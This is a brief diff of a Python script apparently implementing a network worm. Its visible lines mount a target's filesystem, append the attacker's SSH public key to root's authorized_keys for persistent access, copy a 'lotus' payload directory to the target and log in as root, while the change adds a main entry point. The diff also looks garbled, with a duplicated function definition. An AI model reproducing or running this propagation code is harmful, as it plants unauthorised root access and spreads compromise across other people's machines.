@@ -49,6 +49,9 @@ def main():
             subprocess.run(['cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys'], shell=True)
             subprocess.run(['umount /tmp/r00t'], shell=True)
             subprocess.run(['scp -r ~/lotus root@' + str(ip) + ':/'], shell=True)
-            subprocess.run(['ssh root@'  + str(ip)], shell=True)         
+            subprocess.run(['ssh root@'  + str(ip)], shell=True)                 
+def main():
     worm()
-main()
+# Press the green button in the gutter to run the script.
+if __name__ == '__main__':
+    main()
